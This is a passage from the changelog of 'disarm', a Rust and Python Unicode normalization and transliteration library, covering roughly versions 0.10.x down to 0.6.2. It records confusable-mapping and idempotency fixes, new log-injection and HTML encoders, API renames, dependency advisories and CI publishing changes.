  entry (`→ s`), where a naïve "NFC the input first" would have decomposed it and
  changed the output. It is gated on a combining-mark check, so mark-free input (ASCII,
  CJK, precomposed letters) keeps its borrow/zero-allocation fast path; it composes the
  full cluster (Vietnamese `ệ`, polytonic Greek `ᾷ`, and Brahmic two-part vowels like
  Bengali `ো`). A self-guarding audit enumerates the public entrypoints and asserts the
  invariant, so a future entrypoint that forgets to normalize fails the test, not in
  production.

- **Digit confusables fold to their digit, not a look-alike letter (#439).** The
  confusable maps mapped many non-ASCII digit sources to letters or punctuation —
  Arabic-Indic `٠`→`.`, `١`→`l`, `٥`→`o`, Devanagari/Bengali/NKO zeros→`o`/`O`, and
  the Unicode 16 outlined digits `𜳰`→`O` / `𜳱`→`l`. The root cause: `gen_confusables.py`
  classifies digits via `unicodedata`, so running it under a Python whose Unicode
  table is older than the bundled `confusables.txt` silently mis-folds any digit
  that table doesn't yet know. The generator now (a) folds every `Nd` digit source
  to its canonical ASCII digit and (b) refuses to run under a Unicode table older
  than the data (warning on any mismatch). The maps are regenerated: every digit
  spoof now canonicalizes to the plain digit (`٠`/`०`/`𜳰` → `0`), keeping numbers
  numeric (the `llm_guardrail` "digits are never remapped to letters" guarantee).

- **`sort_key` / `search_key` / `catalog_key` are now idempotent across scripts
  and cases (#419).** The transliterating key presets ran `transliterate` before
  `fold_case`, so a cased letter whose *folded* form is in the table but whose
  original is not — e.g. a Georgian Mtavruli capital `Ჱ` (U+1CB1), absent from the
  table, folds to Mkhedruli `ჱ` which transliterates to `he` — only transliterated
  on the *second* pass, violating `f(f(x)) == f(x)`. `fold_case` now runs **before**
  `transliterate` so both passes see the same form. `search_key`/`catalog_key`
  additionally fold **again** after transliterate, since full transliteration can
  *emit* uppercase ASCII (`£`→`GBP`, `№`→`No`) that the pre-fold can't reach — those
  keys are now lowercase and stable. Output change: a few currency/symbol inputs
  that previously produced uppercase keys now fold to lowercase. Idempotency is
  pinned by per-preset property tests.

- **`security_clean` / `normalize_user_input` idempotency on duplicate combining
  marks (#434, #416 residual).** A *duplicate* combining mark broke the single
  `NFC → confusables → NFC` sandwich: NFC composed only one mark onto the base, the
  TR39 fold dropped it, and the recomposing NFC reattached the *spare* mark —
  re-creating a foldable composed character the next call would consume, so
  `f(f(x)) != f(x)` (`"c"`+◌̧+◌̧ → `"ç"` then `"c"`). The confusable fold is now
  iterated to a fixed point (each pass removes ≥1 mark, so it converges in a
  couple of iterations), making both presets true fixed points. The `#416`
  Hypothesis idempotency property is re-broadened and the `normalize_user_input`
  Rust proptest strengthened from nfc-modulo to raw equality.

- **Line controls no longer join tokens in `collapse_whitespace` (#433).** TAB
  and LF folded to a space, but VT, FF, CR, NEL, and the information separators
  (`U+001C`–`U+001F`) were *deleted* — so `a` + CR + `b` became `ab` while `a` +
  LF + `b` became `a b`. All of them are Unicode whitespace; deleting them was an
  invisible-join (coalescence) vector. They now all fold to a single space, so
  `a\rb` → `a b`. The blank-rendering Braille and Hangul fillers, which category
  detection passed straight through, are folded too.

- **`security_clean` / `sort_key` idempotency on invisible-separated combining
  marks (#416).** When an invisible code point separated a base character from a
  combining mark (e.g. `"a"` + `U+200B` + combining acute + `"b"`), the leading
  NFKC passed over the still-separated mark and the later zero-width strip then
  left the base and mark adjacent but *decomposed* — so the composed form
  appeared only on the second call, violating the documented `f(f(x)) == f(x)`
  invariant (which `THREAT_MODEL.md` classifies as a vulnerability). An **NFC pass
  after the strips** now recomposes the adjacency on the first call, in the Rust
  core, so every binding inherits it. For `security_clean` a second, deeper cause
  was also fixed: TR39 confusable skeletoning is **not normalization-stable** (it
  drops the diacritic on some *composed* accented letters — `ç`→`c`, `ø`→`o` — but
  not the *decomposed* form, and can emit a decomposed skeleton like `Ý`→`Y`+◌́),
  so the confusable fold is now **sandwiched between two NFC passes** and the
  pipeline is a verified fixed point under a strengthened raw-equality proptest.
  **Output change:** for these previously non-idempotent inputs the first call now
  returns the composed NFC form. `sort_key` was affected only because it began
  *preserving* accents in #411 (`search_key`/`catalog_key`, which fold accents
  away, were never affected). A separate, pre-existing `sort_key` non-idempotency
  (transliterate-before-fold-case on a case pair) is tracked in #419.

### Internal

- **Dependency-freshness audit across every manifest + full dependabot coverage.**
  Dependabot only watched the root cargo/uv/actions manifests, so the binding crates
  rotted a full major unseen (`napi` 2→3, `magnus` 0.7→0.8). `.github/dependabot.yml`
  now watches **every** manifest — the core crate and both binding workspaces (cargo),
  the Node package (npm), and the Ruby bundle (bundler) — and a new dev-time
  `scripts/audit_dependencies.py` audits all of them against their registries in one
  command (`--strict` to fail on a major lag), run weekly by the `dependency-audit`
  workflow. The guard makes any future config gap visible instead of silent. See
  [DEPENDENCY_UPGRADES.md](DEPENDENCY_UPGRADES.md). The DCO check now exempts
  trusted GitHub App bots (`*[bot]` authors, e.g. `dependabot[bot]`) — matching the
  official DCO app's default — so dependabot's PRs can finally satisfy branch
  protection and auto-merge instead of every bump being silently blocked.

- **The Tier 3 exhaustive+formal gate now guards every publish, not just PyPI/crates.io (#159, #395).**
  The pre-publish regimen — the exhaustive Rust domain tests (`#[ignore]`) and the
  Python formal invariants (`@pytest.mark.formal`) — moved out of an inline job in
  `publish.yml` into a reusable `workflow_call` workflow (`.github/workflows/tier3.yml`)
  that **all four** publish paths depend on: the PyPI wheel, the crates.io core, the
  **RubyGems gem**, and the **npm addon**. Previously only the wheel and the core were
  gated, so a release whose core failed the exhaustive net could still ship the
  bindings. Also wired the exhaustive grapheme-integrity suite (`exhaustive_grapheme`,
  #174) into the gate alongside `exhaustive_transliterate` — it was documented "run
  before release" but had never actually been in the release workflow.

- **Binding publish workflows build against the in-repo core on non-publish events (#374, #396).**
  `publish-ruby.yml`'s `test` job and `publish-node.yml`'s `build` job compiled the
  binding against the *published* core, so a pre-release binding that calls a core API
  not yet on crates.io (e.g. `has_anomalies` before this release) failed to build on
  every PR/push — red on `main` until the matching core shipped. They now apply the
  same CI-only `[patch.crates-io]` redirect to the in-repo core that `ci.yml`'s drift
  gate uses, but only on `push` / `pull_request`; on `release` / `workflow_dispatch`
  the shipped gem and prebuilt addon still build against the **published** core,
  unchanged.

- **Node binding: bumped vitest 3 → 4, dropping a vulnerable dev-only esbuild (#392, #394).**
  The Node binding's test runner pulled in esbuild 0.27.7 — a dev-only transitive
  dependency, never part of the published npm package — which carried two HIGH
  advisories (`GHSA-gv7w-rqvm-qjhr`, `GHSA-g7r4-m6w7-qqqr`). vitest 4 pulls vite 8,
  which demotes esbuild to an optional peer dependency, so the vulnerable package
  drops out of the resolved tree entirely (`npm audit` reports zero vulnerabilities).
  The Node test matrix is unchanged (20/22).

## [0.10.0] — 2026-06-15

The **multi-language milestone** (epic #326): disarm becomes a publishable,
pyo3-free **Rust crate** with a first-class idiomatic Rust API, gains a **Ruby**
binding, and adds opt-in diagnostic **logging** — all over a single shared
pure-Rust core. The Python package is unchanged for callers (same `import disarm`
surface); the work is the core extraction and the new non-Python surfaces.

### Added

- **Pure-Rust core, published to crates.io** (#38, #42). The default build is now
  the pyo3-free core (`default = []`); the Python extension is the opt-in
  `extension-module` feature, so `cargo add disarm` pulls a clean Rust library
  with no libpython in its dependency tree (enforced by a CI gate: the default
  `cargo tree -e no-dev` tree must contain no `pyo3`, matched case-insensitively).
  The codebase is organized in three layers: Layer-1 `pub(crate)`
  algorithm cores, Layer-2 the public `disarm::api`, and Layer-3b the
  feature-gated pyo3 shims — all consuming one implementation.
- **Idiomatic Rust API (`disarm::api`)** (#352, #361, #362). The semver-governed
  crates.io surface: typed enums (`TargetScript`, `Scheme`, `NormalizationForm`,
  `UrlComponent`, `Platform`, `ReverseLang`) that each round-trip via
  `as_str`/`Display`/`FromStr`; the `Transliterate` builder with `Scheme` /
  `OnUnknown` (which carries its replacement in the `Replace(String)` variant);
  an opaque `Error` with a stable `ErrorKind`/`code()`; `Cow<'_, str>`
  borrow-on-no-op returns; a `graphemes()` iterator; the `SlugConfig` builder; the
  `DisarmStr` extension trait for method-call syntax; named `#[non_exhaustive]`
  struct returns (`EncodingDetection`, `DecodedText`, `HostnameAnalysis`,
  `Untranslatable` — no anonymous tuples); and a **guarded** process-global
  registration API (`register_lang` / `register_replacements` /
  `remove_replacement` / `clear_replacements` / `seal_registrations`) that
  enforces the registration cap and the one-way seal latch. Two contract tests
  fail CI if a `pub fn` ever returns a tuple or a token enum loses its round-trip.
- **Ruby bindings — the `disarm` RubyGem** (#45, #357). A
  [magnus](https://github.com/matsadler/magnus)-based native extension wrapping
  the pure-Rust core (no Python), with an idiomatic Ruby surface: keyword
  arguments with defaults, symbol tokens (`:latin`, `:strict_iso9`, …), a single
  `transliterate(text, scheme:)`, and a `Disarm::Error < StandardError`
  hierarchy. Precompiled platform gems (Linux x86_64/aarch64, macOS
  x86_64/arm64, Windows) install with no local Rust toolchain.
- **Opt-in, binding-neutral diagnostic logging** (#208, #358). Behind the
  `log` / `log-content` features (off by default), the core emits structured
  records at API boundaries via the [`log`](https://docs.rs/log) facade — **zero
  cost when off** (the macros compile to nothing) and never inside a per-codepoint
  hot loop (enforced by a source-scan test). Default-level records carry
  **metadata only** (lengths, counts, flags, durations, error codes — never input
  or output content, enforced by a redaction sentinel test); the `log-content`
  TRACE escape hatch routes its truncated samples through disarm's own
  `strip_log_injection` (dogfooding) so a log line can never forge a record.

### Changed

- **Native module renamed `disarm._disarm` → `disarm._core`** (#42). The public
  Python API is unchanged — callers `import disarm`. The native module name is an
  implementation detail the public surface doesn't require; the package's own
  internals (and the type-stub drift checks) reference `disarm._core` directly, so
  any consumer reaching into it should update the path.

### Fixed

- **Confusables: cross-script ASCII folds and additive Greek/Cyrillic pairs**
  (#341, #342, #343), plus the halfwidth vertical form U+FFE8 residue (#245).
- **Terminal width: corrected the additivity-across-space precondition** (#279).

### Security

- **HAI-SDLC hardening pass over the Rust core** (#360): a deep multi-pass review
  (0 critical / 0 high) actioned into 21 fixes — tightened a hostname IPv6-literal
  zone-id check, added limit-rejection logging, a unique-slug truncation-error fix,
  and an allocation-free `is_normalized`, among others.

### Internal

- **Wired Tier 3 (exhaustive + formal) into the release/publish gate** (#159, epic #326). `publish.yml` now runs a `tier3` job on the release/publish trigger that executes the exhaustive Rust domain tests (`cargo test --no-default-features --test exhaustive_transliterate -- --ignored`) and the Python formal invariants (`pytest -m formal`, against a freshly built wheel). Every wheel/sdist build job and the `publish` job `needs:` it, so a Tier-3 failure blocks the upload to PyPI — closing the gap where these tiers were a manual pre-release step. They remain excluded from fast PR CI; the `#[ignore]` / `@pytest.mark.formal` markers are untouched.
- **Split the 1,200-line `src/api.rs` into cohesive submodules** (`api/{safety,text,transliterate,presets}.rs`) re-exported from `api/mod.rs`, with the `DisarmStr` trait in the hub (#361). No public-path change.
- **`translit-rs` 0.8.2 redirect shim** published so the old PyPI name points users at `disarm` (#264 follow-up).

## [0.9.1] — 2026-06-13

### Added

- **`strip_log_injection(text, *, replacement='\ufffd', keep_tab=False)`** (#307). A stateless, character-level encoder that makes untrusted text safe to *write* as a log line: it replaces CR/LF/NEL/LS/PS (record forging), NUL/C0/C1 controls (parser corruption), and ESC/DEL (terminal hijack via ANSI escapes) with `replacement` (default U+FFFD). `\t` is neutralized by default (`keep_tab=False`) to block TSV/logfmt column injection. Idempotent; ASCII-clean fast-path returns the original object; never emits a raw CR/LF/ESC. It owns the log-record and operator-terminal sinks but makes **no** HTML-log-viewer-safety claim (that is stored XSS — encode at the viewer with `escape_html`) and is not a log4shell defense (see Threat Model).
- **`escape_html(text)` and `percent_encode(text, *, component)` output encoders** (#311). Standalone *terminal* encoders applied at the output sink — deliberately **not** `TextPipeline`/`PROFILES` steps (a pipeline is context-free; baking encoding in invites double-encoding and wrong-context escaping). `escape_html` escapes the five HTML metacharacters for element/quoted-attribute context (ASCII fast-path returns the original object; not idempotent by design). `percent_encode` does RFC 3986 percent-encoding for a required `Component` (`PATH`/`SEGMENT`/`QUERY`/`FORM`; UTF-8 byte-based, ASCII output, `FORM` uses space→`+`). Both are mechanism-named and carry the #306 scope-boundary discipline: they are the narrow, context-pinned exception to "disarm is not an output sanitizer," not a general XSS/injection defense (see Threat Model).

### Changed (breaking)

- **Renamed `is_safe_hostname()` → `is_suspicious_hostname()` and inverted its boolean.** The old name asserted a safety it cannot guarantee — `safe=True` only meant "no mixed-script label and no *bundled-table* confusable found," yet whole-script spoofs and out-of-table confusables still returned `safe=True` (the false-assurance pattern #306/#308/#309 removed elsewhere, but as a literal `safe` boolean a caller branches on). The function now returns `(suspicious, analysis)` where `suspicious=True` means a problem was detected; the result struct `SafeHostnameDetails` → `HostnameAnalysis`, field `safe` → `suspicious` (inverted). The granular `scripts` / `mixed_script` / `has_confusables` / `canonical` fields are unchanged. No alias — invert call sites: `safe, d = is_safe_hostname(h)` → `suspicious, a = is_suspicious_hostname(h)`. (#313)
- **Renamed policy profile `web_input_sanitize` → `normalize_web_input`.** Follows the `sanitize_user_input → normalize_user_input` rename: "sanitize" wrongly implied output/injection safety, and was especially misleading here because this profile is *lighter* than `normalize_user_input()` (NFKC + confusables only; no bidi/zero-width/control/zalgo stripping). Use `get_pipeline("normalize_web_input")`. No alias is kept.
- **Renamed `sanitize_user_input()` → `normalize_user_input()`.** The old name implied output sanitization (injection safety); this preset performs *input Unicode normalization* only and is not an XSS/SQL defense (see Threat Model). The `PRESETS` registry key changes to match (`"normalize_user_input"`). No alias is kept — update call sites directly.

### Documentation

- **Stated the XSS/injection scope boundary explicitly** (#306): README, the docs site, and THREAT_MODEL now say plainly that disarm normalizes *input* and is **not** an output sanitizer — it performs no HTML/JS/SQL/shell escaping and never replaces context-aware output encoding at the sink (NFKC can even *surface* ASCII metacharacters from fullwidth lookalikes). This boundary is the conceptual basis for the renames and the new output encoders in this release.

### Security

- **Supply-chain hardening** (#260): added `cargo deny` (license allow-list, banned/wildcard crates, crates.io-only sources via `deny.toml`) to the required *Rust checks passed* gate, alongside the existing `cargo audit`. Releases now attach a CycloneDX SBOM (`*.cdx.json`) of the Rust dependency graph, and PyPI distributions carry PEP 740 build-provenance attestations via OIDC Trusted Publishing. Verification is documented in SECURITY.md.
- **Bumped `pyo3` 0.24 → 0.29**, resolving two upstream advisories: `GHSA-36hh-v3qg-5jq4` (HIGH — out-of-bounds read in `nth`/`nth_back` for `PyList`/`PyTuple` iterators) and `GHSA-chgr-c6px-7xpp` (MEDIUM — missing `Sync` bound on `PyCFunction::new_closure` closures). Includes the binding-layer API migration the bump requires (GIL `with_gil`/`allow_threads` → `attach`/`detach`, `PyObject` → `Py<PyAny>`, `downcast_exact` → `cast_exact`); no functional change to any transform. (#315)

### Internal

- **Docs: build the MkDocs site in CI and deploy to Cloudflare Pages** (served at the unchanged `docs.disarm.dev`), replacing the Read the Docs trigger. `mkdocs build --strict` runs in GitHub Actions (Python-only — mkdocstrings parses source statically); push to `main` deploys production, PRs get preview deploys. Legacy `/en/latest/*` URLs 301 to root via `docs/_redirects`. Removed `.readthedocs.yaml` and `RTD_TOKEN`. (#314)
- **CI: replaced the custom `conversations-resolved.yml` workflow with GitHub's native *Require conversation resolution before merging* branch-protection setting.** The bespoke "Conversations resolved" status check (#55) was flaky — stale check runs lingered after threads were resolved and blocked otherwise-green PRs. Behavior is unchanged (unresolved review threads still block merge), now enforced by the built-in gate instead of a workflow + required status check.

## [0.9.0] — 2026-06-11

The first release under the **`disarm`** name — the continuation of `translit-rs`
(last released as `0.8.1`). See #264 for the rename rationale. The `0.0.0` entries
on PyPI / crates.io / npm are name-reservation placeholders, not releases; `0.9.0`
is the first functional `disarm` release.

### Changed

- **Renamed the project from `translit` to `disarm`** (#264). This unifies the
  distribution and import names under a single `disarm`:
  - PyPI distribution `translit-rs` → `disarm`; `import translit` → `import disarm`.
  - Native module `translit._translit` → `disarm._disarm`; crate `translit` → `disarm`.
  - Console script `translit` → `disarm`.
  - **Breaking:** the public base exception `TranslitError` → `DisarmError`
    (the subclasses `InvalidArgumentError` / `ResourceLimitError` /
    `UnsupportedError` keep their names). `DisarmError` remains a `ValueError`
    subclass, so `except ValueError` keeps working.
  - **Breaking:** the context-dictionary environment variable
    `TRANSLIT_DICT_DIR` → `DISARM_DICT_DIR`.
  - Canonical URLs moved to `https://disarm.dev` / `https://docs.disarm.dev`;
    the repository moved to `https://github.com/raeq/disarm`.

### Fixed

- `uv.lock` now declares `requires-python = ">=3.10"`, matching `pyproject.toml`
  (it had drifted to `>=3.9` after the 3.10 floor landed in #277).

## [0.8.1] — 2026-06-11

The final `translit-rs` release and the close of the 0.8 performance-hardening
arc. The project continues as **`disarm`** from `0.9.0` (#264); `0.8.1` exists to
publish honest, production-true benchmark numbers before the rename.

### Changed

- **Benchmarks now run in the fresh-string regime** (#277, #302): every timed
  call receives a newly constructed `str`, the way production traffic always
  does. The prior cached-object measurement let CPython's per-object `AsUTF8`
  cache hide ~105–137 ns/call of UTF-8 encode cost that only `translit` pays
  (pure-Python comparators never call `AsUTF8`), flattering it. JSON records now
  carry `regime: fresh-string/v2`; pre-flip history is the cached `v1` regime and
  must not be compared across regimes.
- **README short-string figures updated to the measured fresh-regime values**:
  ~17× vs Unidecode (Latin), ~14× (mixed scripts), ~13× (Cyrillic/Greek); ~65 ns
  ASCII passthrough; the four-cell Unidecode-own sweep still holds (~1.3× on
  Unidecode's strongest case to ~25×), with a methodology note explaining the
  regime.

## [0.8.0] — 2026-06-11

A **performance and hardening** release. The headline is a benchmark-gated
optimisation programme (#233) that makes short-string `transliterate` roughly
**15–21× faster than Unidecode** (up from ~7–9×) and **beats Unidecode on its
own benchmark**, while *shrinking* the library's static and resident memory.
Alongside it, a Unicode-security hardening sweep tightens `is_safe_hostname`,
the security presets, and the stateful slugifiers. Most changes are
behaviour-preserving; the exceptions are called out under Upgrade notes.

### Upgrade notes

- **Minimum Python is now 3.10** (was 3.9). The extension targets the stable-ABI
  floor `abi3-py310`, so a single wheel runs on 3.10+ and the per-call Python→Rust
  path crosses the boundary only once (#277). Python 3.9 wheels are no longer
  produced.
- **`is_safe_hostname` now flags *every* mixed-script label as unsafe** (#254),
  not only the four Latin-paired high-risk combinations. A label combining two
  scripts with no Latin confusable (e.g. Greek + Cyrillic) previously reported
  `safe=True`; it now returns `safe=False`. This also flags benign combinations
  (e.g. Latin + CJK) — read the `mixed_script` / `scripts` fields if you need a
  more permissive policy. The check fails closed by design.
- **Security presets no longer synthesise path separators** (#248): confusable
  characters that normalise to `/`, `\`, or `..` can no longer pass through the
  security/filename presets to forge path structure.
- **`rag_ingest` now runs the confusables step** (#258): Unicode homoglyph
  spoofs are canonicalised during RAG ingestion instead of surviving it. Output
  of the `rag_ingest` preset may change for homoglyph-bearing input.
- **Stateful slugifiers validate `lang`** at construction (`Slugify`,
  `UniqueSlugify`), closing the gap the 0.7.0 validation pushdown missed (#257);
  an invalid `lang=` now raises instead of being silently ignored. `UniqueSlugify`
  also honours property mutations made after construction (#249).
- **Auto-language discriminator** behaviour was reconciled with its documented
  contract (#253) — auto-detection results may differ for a few ambiguous inputs.
- **Correctness edge cases fixed** (#255), which may change output: reverse
  transliteration of all-caps digraphs and a `grapheme_truncate` overflow case.

### Performance

- **Short-string `transliterate`: ~15–21× faster than Unidecode** (#277). A call
  now crosses the Python→Rust boundary exactly once with Rust-side keyword
  defaults, extracts UTF-8 zero-copy, and returns already-ASCII input as the
  *original* `str` object via a borrowed `Cow` — roughly **70 ns** with no
  allocation.
- **Beats Unidecode on its own benchmark** (#281): translit wins all four cells
  of Unidecode's `expect_ascii`/`expect_nonascii` × ASCII/non-ASCII matrix,
  including Unidecode's strongest (ASCII-passthrough) case.
- **Smaller static tables** (#237): the default BMP transliteration table became
  a two-level page-table + interned-blob trie (**~1 MB → ~58 KB**), hanzi→pinyin
  a dense interned array (**~600 KB → ~50 KB**), and the 11,172 Hangul
  romanisations a single packed blob. No runtime data loading; no `unsafe`.
- **Zero-copy context dictionaries** (#238): the Arabic/Persian/Hebrew
  dictionaries are read once and indexed by `(offset, len)` spans instead of
  parsed into nested `HashMap`s of owned strings — roughly **halving** their
  resident memory. Lookup is binary search; the two-step bigram path allocates
  no per-token key.
- **Linear-time scanning via Aho-Corasick** (#242): global and slug replacements
  use longest/first-match automata instead of repeated per-position probing; the
  `UniqueSlugify` collision counter is amortised; and multi-codepoint emoji are
  matched through a code-point trie.
- Per-character hot-loop improvements — resolve-once language tables, block-table
  dispatch, ASCII-run skipping (#235); fewer copies on the ASCII/identity path
  (#236); chunked batch extraction that caps peak memory (#239); single-pass
  strict mode, O(u)→O(1) in time and space (#240); further ASCII fast-paths and
  removal of O(n·k) scans (#252).
- A **benchmark harness with a deterministic iai-callgrind estimated-cycle gate**
  guards every PR against regressions in CI (#234).

  > Note: the batch (`list[str]`) API's advantage over a Python loop has narrowed
  > for short strings now that a scalar call is ~70 ns — for tiny inputs it is at
  > rough parity. Its durable value is the single GIL-released crossing (thread
  > parallelism), not a raw per-call speedup. See `docs/performance.md`.

### Added

- **`TextPipeline(preset=…)`** constructor and related new-surface ergonomics
  (#259).
- **CLI**: `slugify` honours `--lang`; the `strip_bidi` / `strip_zalgo` steps are
  exposed; error output is cleaned up (#250).
- The `errors` parameter annotation now includes `"strict"` in the
  callable-module and `Text` wrappers (#247).

### Changed

- `docs/performance.md` rewritten so **every claim is CI-executed (Sybil) or
  linked to a recorded measurement**, with a stated margin policy, varied
  scenarios, a prominent "where we are slower" section, and a credit paragraph
  for Unidecode and its lineage (#291).

### Internal

- Resource-limit constants centralised in a single `src/limits.rs` module so the
  library's resource posture has one audit surface (#256).
- Cross-cutting Rust-core helpers (`apply_replacements`, `emit_warning`)
  de-duplicated (#251).
- Incorrect docstring examples in the Python wrapper modules corrected (#246).

## [0.7.0] — 2026-06-10

A feature and architecture release. Headlines: a **unified, catchable exception
hierarchy**; **terminal column-width** measurement (`terminal_width` /
`grapheme_width`); native **`errors="strict"`** transliteration; LLM/RAG
guardrail **pipeline presets**; and a substantial **push of validation and
configuration logic down into the Rust core**, so the upcoming multi-language
bindings inherit one behaviour instead of reimplementing it. Most changes are
behaviour-preserving; the exceptions are called out under Upgrade notes.

### Upgrade notes

- **Exceptions now form a hierarchy.** Every library error subclasses
  `TranslitError`, with `InvalidArgumentError`, `ResourceLimitError`, and
  `UnsupportedError` beneath it. `TranslitError` remains a `ValueError`
  subclass, so existing `except ValueError` keeps working. Several error
  **message strings were enriched/standardised** (#186, #187) — code matching
  exact message text may need updating; code matching exception *types* is
  unaffected.
- **`lang=` is validated even for ASCII input** (#197). A binding-side ASCII
  fast path previously skipped language validation, so
  `transliterate("abc", lang="zz")` silently returned the input; it now raises
  `InvalidArgumentError`, matching how non-ASCII input always behaved.
- **`slugify_filename` / `Slugify(safe_chars=…)` output corrected** (see Fixed):
  `slugify_filename("My Report.pdf")` now returns `"My_Report.pdf"`, not
  `"My.Report_pdf"`. Output for inputs that use `safe_chars` may change.
- **New modes:** `errors="strict"` for `transliterate` (#184) and
  `decode_to_utf8(strict=True)` (#189).

### Added

- **`terminal_width` / `grapheme_width`** (#224): terminal **column** width per
  grapheme cluster (UAX #11 East Asian Width). Wide/fullwidth and
  emoji-presented clusters are 2 columns; combining marks, controls, and
  zero-width characters are 0. Ambiguous characters are 1 by default, or 2 with
  `ambiguous_wide=True`. Width data is generated at build time from the pinned
  UCD (no runtime data, no `unsafe`). Measures cells, not pixels; tabs are not
  expanded.
- **`errors="strict"` + `find_untranslatable`** (#184): strict transliteration
  raises on the first untranslatable character (reporting it and its byte
  offset); `find_untranslatable` returns all of them without raising.
- **Guardrail pipeline presets** (#139): `TextPipeline` gains `strip_bidi` and
  `strip_zalgo` steps and the `llm_guardrail` / `rag_ingest` named profiles for
  LLM/RAG input sanitisation.
- **`get_pipeline` / `list_profiles`** (#229): the named policy-profile registry
  now lives in the Rust core; the Python helpers are thin wrappers over it.
- **`decode_to_utf8(strict=True)`** (#189): raise on lossy/replacement decoding
  instead of silently substituting U+FFFD.

### Changed

- **Unified exception hierarchy** (#183): the Python error surface is a
  `TranslitError` base with categorised subclasses; sites that previously raised
  bare `ValueError` are unified (foundation laid in 0.6.3 via #181).
- **Validation moved into the Rust core** (#185, #217, #229, #230, #231): enum
  validation, the `transliterate()` argument-conflict matrix, non-negative
  `max_length` / `max_graphemes` checks, `safe_chars`, and `min_confidence`
  range-checking now live in the core, so other bindings enforce the identical
  contract without reimplementing it. The Python layer keeps only type guards.
- **Actionable error messages** (#186, #187): weak messages now name the
  offending value, list valid options, and suggest a "did you mean…?" where
  applicable; message style is standardised across the surface.
- **Error cause chains** (#188): wrapped errors surface the underlying cause via
  `__cause__` rather than flattening it into the message.
- **`TextPipeline` step ordering** (#174) is derived from a single source of
  truth, removing drift between configuration and execution order.
- **All-ASCII preset fast path** (#198): presets skip the NFKC pass for pure-ASCII
  input (behaviour-preserving).

### Fixed

- **`slugify_filename` / `Slugify(safe_chars=…)`** preserved safe characters at
  the wrong positions — `slugify_filename("My Report.pdf")` returned
  `"My.Report_pdf"` instead of the awesome-slugify-correct `"My_Report.pdf"`.
  `safe_chars` are now handled natively in the Rust core: kept verbatim and
  treated as word characters so they hold their position (#156, #230). The prior
  test only covered a dot-free input, so the bug was uncaught; regression tests
  now cover filenames with extensions, multiple dots, and `UniqueSlugify` +
  `max_length`.
- **`slugify(default=…)`** is now sanitised through the same slug pipeline (so a
  caller-supplied fallback cannot smuggle path-traversal or URL metacharacters
  into output documented as URL-safe), threads through the stateful `Slugifier` /
  `UniqueSlugifier` forms, and a negative `max_length` now raises a catchable
  `InvalidArgumentError` on both the scalar and batch paths instead of an
  uncatchable `OverflowError` (#193, #169).
- **Low-severity hardening bundle** (#200): eight small robustness fixes
  (bounds, overflow, and edge-case handling) gathered into one pass.

### Security

- The RustSec advisory audit (`cargo-audit`) now **blocks merge** via the
  required "Rust checks passed" gate on every PR — an advisory can land on a
  dependency without any code change here (#195).

### Removed

- **Docker image build/publish** and its Trivy CVE scan (#138). translit is a
  `pip install`-first library; previously published images remain as historical
  artifacts, but no new ones are produced. Install the CLI via
  `pip install translit-rs`.

### Documentation

- **Executable cookbook** (#154, #91, #140, #156, #172): a Sybil doc-test harness
  with a CI gate, unidecode→translit migration recipes, an "LLM pipelines" page,
  a tokenizer-preprocessing page, and an anti-rot lint that turned 307 decorative
  `# =>` claims into checked assertions.
- **normalize-first canonicalisation recipe** (#174) and a **formal-verification
  assurance taxonomy** (#223 — proof-by-exhaustion / structural / property-tested,
  tagging each I1–I7 invariant), plus grapheme-integrity property tests (#174).
- The project adopted the **Developer Certificate of Origin** (#165); all commits
  are signed off. The custom-emoji-provider 9-codepoint window cap is now
  documented (#199).

## [0.6.3] — 2026-06-08

A correctness, maintenance, and architecture-foundation release. **No output-affecting
changes** — every fix is behaviour-preserving and the one new public behaviour
(`slugify(default=...)`) is opt-in. Headline: a pure-Rust error model is now in place,
laying the foundation for the multi-language bindings on the roadmap.

### Upgrade notes

- **No output-affecting changes.** Existing output and every exception type/message are
  unchanged.
- New opt-in: `slugify(text, default="…")` returns the fallback when the input has no
  sluggable characters (emoji / punctuation / zero-width) instead of `""`. `default=None`
  (the default) preserves the prior empty-string behaviour.

### Added

- `slugify(default=...)` — opt-in fallback for inputs that would otherwise slug to the
  empty string, closing an empty-slug routing hazard (#97).

### Fixed

- `PRESETS["strip_obfuscation"]` metadata now reflects the real pipeline order
  (`confusables` runs after `demojize`), matching `src/presets.rs` (#141).
- Lock-poison recovery now emits a Python `UserWarning` naming the recovered table,
  instead of a silent stderr line (#117).
- `docs/api/exceptions.md` corrected — `TranslitError` inherits from `ValueError` (not
  `Exception`), and every example message string now matches the real output (#182).

### Changed (internal — behaviour-preserving)

- **Error model (#181, part of #180):** a pure-Rust `Error` enum (`thiserror`) with a
  stable `code()` per variant and a single `From<Error> for PyErr` boundary; ~35 error
  sites migrated off in-core `PyErr` construction. Removes the core↔PyO3 coupling and
  lays the foundation for non-Python bindings. Python exception types and messages are
  unchanged.
- **Dependencies:** `phf` / `phf_codegen` 0.11 → 0.13, `criterion` 0.5 → 0.8,
  `chardetng` 0.1 → 1.0 — each migrated and verified behaviour-preserving (#146, #153,
  #164).
- `build.rs` now auto-discovers language override tables — adding a language is just
  dropping in a `translit_lang_*.tsv` (#74).
- Generated `.pyi` stubs are now guarded by a stub/binary signature drift-check, which
  caught and fixed 18 stale stub signatures (#76).

### Maintenance

- Split `python/translit/__init__.py` (2,683 lines) into `_api.py` + `_presets.py` (#73).
- Split `tests/integration_transliterate.rs` by script family (#75).
- Process: a required "Conversations resolved" merge gate (#55); a documented
  dependency-upgrade methodology with Dependabot cooldown + auto-merge
  (`DEPENDENCY_UPGRADES.md`, `RELEASING.md`).

## [0.6.2] — 2026-06-07

A correctness, security, performance and maintenance release triaged from a
post-0.6.1 issue sweep (#101–#132). No public API removed; one small new public
behaviour (`slugify(save_order=True)` now functions). **Two output-affecting
fixes** — see *Upgrade notes*.

### Upgrade notes (output-affecting)

- **`slugify(save_order=True)`** was an accepted no-op; it now strips only
  leading/trailing stopwords (preserving interior word order), matching
  python-slugify (#118). If you passed `save_order=True`, slug output changes.
- **`decode_to_utf8` default `min_confidence` `0.5` → `0.95`** (#103). The old
  default was inert (the detector only reports `0.50`/`0.95`, and `0.50 < 0.50`
  is false), so it never rejected. It now requires high confidence by default;
  pass `min_confidence=0.0` to accept any guess. (No practical change today —
  the detector currently always reports `0.95`.)

### Fixed

- **#102** — `UniqueSlugify` no longer panics across the FFI boundary on a
  multibyte separator + small `max_length` (byte slice landed mid-codepoint;
  now uses `floor_char_boundary`).
- **#101** — context bigram disambiguation tier was unreachable (it reset on
  every inter-word space); it now resets only on hard boundaries, so the tier
  fires in normal prose.
- **#104** — `set_emoji_provider` now obeys `seal_registrations()` (the provider
